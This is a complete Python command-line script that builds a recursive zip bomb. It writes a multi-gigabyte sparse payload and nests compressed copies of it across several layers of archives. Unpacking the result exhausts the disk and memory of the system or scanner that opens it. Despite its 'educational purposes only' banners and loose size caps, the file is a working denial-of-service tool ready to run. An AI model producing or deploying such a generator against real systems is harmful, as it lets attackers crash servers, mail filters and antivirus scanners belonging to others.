#!/usr/bin/env python3
# Zip Bomb Generator - Educational Purposes Only

import os
import zipfile
import argparse
from pathlib import Path

def create_payload(file_path: Path, size_gb: int) -> None:
    """Create dummy payload file of specified size"""
    with open(file_path, "wb") as f:
        f.seek(size_gb * 1024**3 - 1)
        f.write(b'\0')

def generate_zip_bomb(
    output_name: str = "bomb.zip",
    layers: int = 5,
    files_per_layer: int = 10,
    payload_size_gb: int = 1,
    temp_dir: str = "tmp_bomb"
) -> None:
    """
    Generate a recursive zip bomb
    
    Args:
        output_name: Output filename
        layers: Number of recursive layers
        files_per_layer: Files per layer
        payload_size_gb: Base payload size in GB
        temp_dir: Temporary directory for generation
    """
    # Safety checks
    if layers > 10:
        raise ValueError("Safety limit: layers cannot exceed 10")
    if payload_size_gb > 10:
        raise ValueError("Safety limit: payload size cannot exceed 10GB")
    
    print("⚠️ WARNING: Generating zip bomb - for educational purposes only!")
    print(f"• Layers: {layers}")
    print(f"• Files per layer: {files_per_layer}")
    print(f"• Payload size: {payload_size_gb}GB")
    
    # Setup temp directory
    temp_path = Path(temp_dir)
    temp_path.mkdir(exist_ok=True)
    os.chdir(temp_path)
    
    try:
        # Create base payload
        create_payload(Path("base.txt"), payload_size_gb)
        prev_files = ["base.txt"]
        
        # Build recursive layers
        for layer in range(layers):
            new_files = []
            for file_num in range(files_per_layer):
                zip_name = f"layer_{layer}_{file_num}.zip"
                with zipfile.ZipFile(zip_name, "w", zipfile.ZIP_DEFLATED) as zf:
                    for f in prev_files:
                        zf.write(f, arcname=os.path.basename(f))
                new_files.append(zip_name)
            prev_files = new_files
        
        # Create final output
        with zipfile.ZipFile(output_name, "w", zipfile.ZIP_DEFLATED) as zf:
            for f in prev_files:
                zf.write(f, arcname=os.path.basename(f))
        
        # Move to parent directory
        os.rename(output_name, f"../{output_name}")
        print(f"✅ Zip bomb generated: {output_name}")
    
    finally:
        # Cleanup
        os.chdir("..")
        for root, dirs, files in os.walk(temp_dir):
            for f in files:
                os.unlink(os.path.join(root, f))
        os.rmdir(temp_dir)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Educational Zip Bomb Generator",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument(
        "-o", "--output",
        default="bomb.zip",
        help="Output filename"
    )
    parser.add_argument(
        "-l", "--layers",
        type=int,
        default=5,
        help="Number of recursive layers"
    )
    parser.add_argument(
        "-f", "--files",
        type=int,
        default=10,
        help="Files per layer"
    )
    parser.add_argument(
        "-s", "--size",
        type=int,
        default=1,
        help="Base payload size in GB"
    )
    
    args = parser.parse_args()
    
    try:
        generate_zip_bomb(
            output_name=args.output,
            layers=args.layers,
            files_per_layer=args.files,
            payload_size_gb=args.size
        )
    except Exception as e:
        print(f"❌ Error: {e}")
        print("Please use responsibly and for educational purposes only.")
